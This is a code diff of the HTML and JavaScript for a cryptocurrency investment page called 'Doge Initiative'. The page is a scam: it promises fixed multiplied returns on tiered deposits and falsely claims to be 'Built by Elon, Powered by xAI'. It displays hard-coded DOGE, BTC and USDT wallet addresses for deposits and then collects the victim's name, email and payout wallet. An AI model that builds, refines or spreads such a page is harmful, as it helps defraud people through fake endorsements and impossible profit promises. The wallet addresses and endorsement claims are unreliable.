@@ -4,6 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Doge Initiative — Verify Investment</title>
+  <meta name="description" content="Confirm your crypto investment with the Doge Initiative.">
   <link rel="icon" href="favicon.ico" type="image/x-icon" />
   <style>
     * {
@@ -24,21 +25,10 @@
     body::before {
       content: "";
       position: fixed;
-      top: -100%;
-      left: -100%;
-      width: 300%;
-      height: 300%;
-      background: transparent;
-      animation: stars 60s linear infinite;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%);
       z-index: -2;
-    }
-    @keyframes stars {
-      from {
-        transform: rotate(0);
-      }
-      to {
-        transform: rotate(360deg);
-      }
     }
 
     nav {
@@ -46,22 +36,19 @@
       top: 0;
       background: rgba(17, 17, 17, 0.85);
       padding: 1rem 2rem;
-      width: 100vw;
+      width: 100%;
       box-sizing: border-box;
       backdrop-filter: blur(5px);
       z-index: 100;
       display: flex;
       justify-content: center;
     }
-    nav > .nav-inner {
+    nav .nav-inner {
       width: 100%;
       max-width: 960px;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 0;
-      margin: 0 auto;
-      box-sizing: border-box;
     }
     .logo {
       font-size: 1.8rem;
@@ -70,8 +57,6 @@
       display: flex;
       align-items: center;
       gap: 0.5rem;
-      user-select: none;
-      cursor: default;
     }
     .logo span {
       font-size: 2rem;
@@ -85,20 +70,16 @@
       font-weight: 600;
       color: #f7b500;
       text-decoration: none;
-      transition: color 0.2s;
-    }
-    nav ul li a:hover {
-      color: #ffd700;
     }
     nav ul li a.active {
-      font-weight: 700;
       color: #fff;
+      font-weight: 700;
     }
 
     main {
       flex: 1;
       max-width: 960px;
-      margin: 2rem auto 4rem;
+      margin: 2rem auto;
       padding: 0 1rem;
       text-align: center;
     }
@@ -107,6 +88,17 @@
       font-size: 2.5rem;
       margin-bottom: 1rem;
       color: #f7b500;
+    }
+
+    .emoji {
+      font-size: 3rem;
+      margin: 1rem 0;
+      animation: float 2.5s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
     }
 
     .step-container {
@@ -128,10 +120,6 @@
       display: flex;
       align-items: center;
       gap: 0.5rem;
-      user-select: none;
-    }
-    .step-box span.emoji {
-      font-size: 1.5rem;
     }
 
     .tier-selection, .coin-selection {
@@ -141,32 +129,25 @@
       justify-content: center;
       margin-bottom: 1.5rem;
     }
+
     .option-card {
       background: rgba(17, 17, 17, 0.85);
       padding: 1.2rem 1.5rem;
       border-radius: 12px;
       cursor: pointer;
-      min-width: 140px;
-      user-select: none;
       border: 2px solid transparent;
-      transition: border-color 0.3s, background-color 0.3s;
       color: #ffd700;
       font-weight: 700;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 0.25rem;
+      transition: border-color 0.3s;
     }
+
     .option-card.selected {
       border-color: #ffd700;
       background-color: rgba(255, 215, 0, 0.1);
     }
-    .option-card.disabled {
-      cursor: not-allowed;
-      opacity: 0.5;
-    }
 
     .wallet-container {
+      display: none;
       margin-top: 1rem;
       background: rgba(17, 17, 17, 0.85);
       padding: 1rem 1.5rem;
@@ -174,32 +155,11 @@
       max-width: 420px;
       margin-left: auto;
       margin-right: auto;
-      user-select: text;
       font-family: monospace;
-      font-size: 1.1rem;
-      color: #f7b500;
-      position: relative;
-    }
-    .wallet-address {
-      cursor: pointer;
-      word-break: break-all;
-      user-select: text;
-    }
-    .copy-hint {
-      font-size: 0.8rem;
-      color: #aaa;
-      margin-top: 0.25rem;
-    }
-
-    .timer {
-      margin-top: 1rem;
-      font-weight: 700;
-      font-size: 1.25rem;
-      color: #fff;
     }
 
     .btn-send {
-      margin-top: 1.5rem;
+      margin-top: 1rem;
       background: #f7b500;
       color: #000;
       padding: 0.8rem 2rem;
@@ -207,17 +167,10 @@
       border-radius: 50px;
       font-weight: bold;
       cursor: pointer;
-      transition: background-color 0.2s;
-    }
-    .btn-send:hover:not(:disabled) {
-      background-color: #ffd700;
-    }
-    .btn-send:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
     }
 
     .form-section {
+      display: none;
       margin-top: 2rem;
       background: rgba(17, 17, 17, 0.85);
       padding: 1.5rem 2rem;
@@ -225,45 +178,34 @@
       max-width: 480px;
       margin-left: auto;
       margin-right: auto;
-      display: none;
+      color: #ffd700;
       text-align: left;
-      color: #ffd700;
     }
-    .form-section label {
-      display: block;
-      margin-bottom: 0.3rem;
-      font-weight: 700;
-      font-size: 0.9rem;
-      color: #ffd700;
-    }
+
     .form-section input {
       width: 100%;
-      padding: 0.6rem 0.8rem;
+      padding: 0.6rem;
       border-radius: 6px;
       border: none;
       margin-bottom: 1rem;
       font-size: 1rem;
       font-family: monospace;
     }
-    .form-section button.submit-btn {
+
+    .submit-btn {
       background: #f7b500;
       color: #000;
-      padding: 0.8rem 2rem;
+      padding: 0.8rem;
       border: none;
       border-radius: 50px;
       font-weight: bold;
-      cursor: pointer;
       width: 100%;
-      font-size: 1.1rem;
-    }
-    .form-section button.submit-btn:hover {
-      background-color: #ffd700;
     }
 
     .confirmation-message {
       display: none;
       max-width: 480px;
-      margin: 2rem auto 4rem;
+      margin: 2rem auto;
       background: #2a2a2a;
       border-radius: 12px;
       padding: 1.5rem 2rem;
@@ -279,26 +221,11 @@
       color: #999;
       text-align: center;
       border-top: 1px solid #222;
-      user-select: none;
     }
+
     footer a {
       color: #ffd700;
       text-decoration: none;
-    }
-    footer a:hover {
-      text-decoration: underline;
-    }
-
-    @media (max-width: 600px) {
-      .step-box {
-        flex: 1 1 100%;
-        max-width: 100%;
-        font-size: 0.95rem;
-      }
-      .option-card {
-        min-width: 100px;
-        font-size: 0.9rem;
-      }
     }
   </style>
 </head>
@@ -316,27 +243,29 @@
   </nav>
 
   <main>
-    <h1>Verify and Invest</h1>
+    <h1>Verify & Confirm</h1>
+    <div class="emoji">💸</div>
 
     <div class="step-container">
-      <div class="step-box"><span class="emoji">1️⃣</span> Choose Your Tier</div>
-      <div class="step-box"><span class="emoji">2️⃣</span> Select Cryptocurrency</div>
-      <div class="step-box"><span class="emoji">3️⃣</span> Copy Wallet Address</div>
-      <div class="step-box"><span class="emoji">4️⃣</span> Click "I Have Sent"</div>
-      <div class="step-box"><span class="emoji">5️⃣</span> Fill Verification Form</div>
+      <div class="step-box">1️⃣ Choose Tier</div>
+      <div class="step-box">2️⃣ Pick Coin</div>
+      <div class="step-box">3️⃣ Copy Wallet</div>
+      <div class="step-box">4️⃣ Send Funds</div>
+      <div class="step-box">5️⃣ Fill Form</div>
     </div>
 
     <section>
-      <h2 style="color:#f7b500; margin-bottom: 1rem;">1. Choose Your Investment Tier</h2>
+      <h2 style="color:#f7b500; margin-bottom: 1rem;">Choose Investment Tier</h2>
       <div class="tier-selection" id="tierSelection">
-        <div class="option-card" data-tier="Basic">Basic<br /><small>$500 → $1,125</small></div>
-        <div class="option-card" data-tier="Gold">Gold<br /><small>$1,000 → $2,700</small></div>
-        <div class="option-card" data-tier="Platinum">Platinum<br /><small>$2,500+ → $7,200</small></div>
+        <div class="option-card" data-tier="Starter">$200<br /><small>Built by Elon, Powered by xAI, since 2024</small></div>
+        <div class="option-card" data-tier="Basic">$500 → $1,125</div>
+        <div class="option-card" data-tier="Gold">$1,000 → $2,700</div>
+        <div class="option-card" data-tier="Platinum">$2,500+ → $7,200</div>
       </div>
     </section>
 
     <section>
-      <h2 style="color:#f7b500; margin-bottom: 1rem;">2. Select Cryptocurrency</h2>
+      <h2 style="color:#f7b500; margin: 2rem 0 1rem;">Select Cryptocurrency</h2>
       <div class="coin-selection" id="coinSelection">
         <div class="option-card" data-coin="DOGE">🐕 Dogecoin</div>
         <div class="option-card" data-coin="BTC">₿ Bitcoin</div>
@@ -345,52 +274,45 @@
       </div>
     </section>
 
-    <section class="wallet-container" id="walletContainer" style="display:none;">
-      <div><strong>Wallet Address:</strong></div>
-      <div class="wallet-address" id="walletAddress" title="Click to copy"></div>
-      <div class="copy-hint">Click address to copy</div>
-      <div class="timer" id="countdownTimer">10:00</div>
+    <section class="wallet-container" id="walletContainer">
+      <div><strong>Wallet:</strong> <span id="walletAddress"></span></div>
       <button class="btn-send" id="sentButton">I Have Sent</button>
     </section>
 
     <section class="form-section" id="formSection">
       <form id="verificationForm">
         <label for="name">Full Name</label>
-        <input type="text" id="name" name="name" required autocomplete="name" />
-        <label for="email">Email Address</label>
-        <input type="email" id="email" name="email" required autocomplete="email" />
-        <label for="payoutWallet">Payout Wallet Address</label>
-        <input type="text" id="payoutWallet" name="payoutWallet" required autocomplete="off" />
+        <input type="text" id="name" required />
+        <label for="email">Email</label>
+        <input type="email" id="email" required />
+        <label for="wallet">Your Payout Wallet</label>
+        <input type="text" id="wallet" required />
         <button type="submit" class="submit-btn">Submit Verification</button>
       </form>
     </section>
 
     <section class="confirmation-message" id="confirmationMessage">
-      Thank you! Your verification is pending. Please check your email for confirmation.
+      ✅ Verification received! Please check your email.
     </section>
+
+    <p style="margin-top:2rem; font-style:italic; color:#aaa;">
+      For any issue, contact us at <a href="mailto:contact@doge-initiative.org">contact@doge-initiative.org</a>
+    </p>
   </main>
 
   <footer>
-    📞 Need help? Text: 707-276-6407 • Email: <a href="mailto:contact@doge-initiative.org">contact@doge-initiative.org</a> |
-    Emergency: <a href="mailto:Elon@doge-initiative.org">Elon@doge-initiative.org</a>
+    📩 Need help? Email: <a href="mailto:contact@doge-initiative.org">contact@doge-initiative.org</a> • Emergency: <a href="mailto:Elon@doge-initiative.org">Elon@doge-initiative.org</a>
   </footer>
 
   <script>
     const tierCards = document.querySelectorAll('#tierSelection .option-card');
     const coinCards = document.querySelectorAll('#coinSelection .option-card');
+    const walletAddress = document.getElementById('walletAddress');
     const walletContainer = document.getElementById('walletContainer');
-    const walletAddressDiv = document.getElementById('walletAddress');
-    const countdownTimer = document.getElementById('countdownTimer');
     const sentButton = document.getElementById('sentButton');
     const formSection = document.getElementById('formSection');
-    const verificationForm = document.getElementById('verificationForm');
     const confirmationMessage = document.getElementById('confirmationMessage');
 
-    let selectedTier = null;
-    let selectedCoin = null;
-    let countdownInterval = null;
-
-    // Wallet addresses
     const walletMap = {
       DOGE: 'D91ME9KqahFu7LLySpr3nPGYY1iheCu8WX',
       BTC: 'bc1qxvjz6kv84awx29p75qhn7qgxtwq4xt3phc7q26',
@@ -398,105 +320,33 @@
       USDT: '0x1a670b57855dE6cED8Cf659Eea8BDDcB0F4C5FE4'
     };
 
-    function resetSelection() {
-      tierCards.forEach(card => card.classList.remove('selected', 'disabled'));
-      coinCards.forEach(card => card.classList.remove('selected', 'disabled'));
-      walletContainer.style.display = 'none';
-      walletAddressDiv.textContent = '';
-      countdownTimer.textContent = '10:00';
-      sentButton.disabled = false;
-      formSection.style.display = 'none';
-      verificationForm.style.display = 'block';
-      confirmationMessage.style.display = 'none';
-      selectedTier = null;
-      selectedCoin = null;
-      clearInterval(countdownInterval);
-    }
-
-    // Select tier
     tierCards.forEach(card => {
       card.addEventListener('click', () => {
-        if (sentButton.disabled) return; // disable if sent clicked
-        selectedTier = card.getAttribute('data-tier');
-        tierCards.forEach(c => c.classList.toggle('selected', c === card));
-        coinCards.forEach(c => c.classList.remove('selected'));
-        walletContainer.style.display = 'none';
-        walletAddressDiv.textContent = '';
-        countdownTimer.textContent = '10:00';
-        formSection.style.display = 'none';
-        confirmationMessage.style.display = 'none';
-        selectedCoin = null;
+        tierCards.forEach(c => c.classList.remove('selected'));
+        card.classList.add('selected');
       });
     });
 
-    // Select coin
     coinCards.forEach(card => {
       card.addEventListener('click', () => {
-        if (!selectedTier) {
-          alert('Please select an investment tier first.');
-          return;
-        }
-        if (sentButton.disabled) return; // disable if sent clicked
-        selectedCoin = card.getAttribute('data-coin');
-        coinCards.forEach(c => c.classList.toggle('selected', c === card));
-        walletAddressDiv.textContent = walletMap[selectedCoin];
+        coinCards.forEach(c => c.classList.remove('selected'));
+        card.classList.add('selected');
+        const coin = card.getAttribute('data-coin');
+        walletAddress.textContent = walletMap[coin];
         walletContainer.style.display = 'block';
-        countdownTimer.textContent = '10:00';
         formSection.style.display = 'none';
-        confirmationMessage.style.display = 'none';
-        sentButton.disabled = false;
-        startCountdown();
       });
     });
 
-    function startCountdown() {
-      clearInterval(countdownInterval);
-      let timeLeft = 600; // 10 minutes in seconds
-      countdownTimer.textContent = formatTime(timeLeft);
-      countdownInterval = setInterval(() => {
-        timeLeft--;
-        countdownTimer.textContent = formatTime(timeLeft);
-        if (timeLeft <= 0) {
-          clearInterval(countdownInterval);
-          countdownTimer.textContent = "00:00";
-        }
-      }, 1000);
-    }
-
-    function formatTime(seconds) {
-      const m = String(Math.floor(seconds / 60)).padStart(2, '0');
-      const s = String(seconds % 60).padStart(2, '0');
-      return `${m}:${s}`;
-    }
-
-    // Copy wallet address on click
-    walletAddressDiv.addEventListener('click', () => {
-      navigator.clipboard.writeText(walletAddressDiv.textContent).then(() => {
-        alert('Wallet address copied to clipboard!');
-      });
-    });
-
-    // "I Have Sent" button logic
     sentButton.addEventListener('click', () => {
-      sentButton.disabled = true;
-      // Disable coin and tier selections
-      tierCards.forEach(card => card.classList.add('disabled'));
-      coinCards.forEach(card => card.classList.add('disabled'));
-      // Show verification form
       formSection.style.display = 'block';
     });
 
-    // Handle verification form submit
-    verificationForm.addEventListener('submit', (e) => {
+    document.getElementById('verificationForm').addEventListener('submit', (e) => {
       e.preventDefault();
-      // Normally here you'd send data to backend API
-      // For demo just show confirmation and hide form
-      verificationForm.style.display = 'none';
+      formSection.style.display = 'none';
       confirmationMessage.style.display = 'block';
     });
-
-    // Initialize page
-    resetSelection();
   </script>
 </body>
 </html>
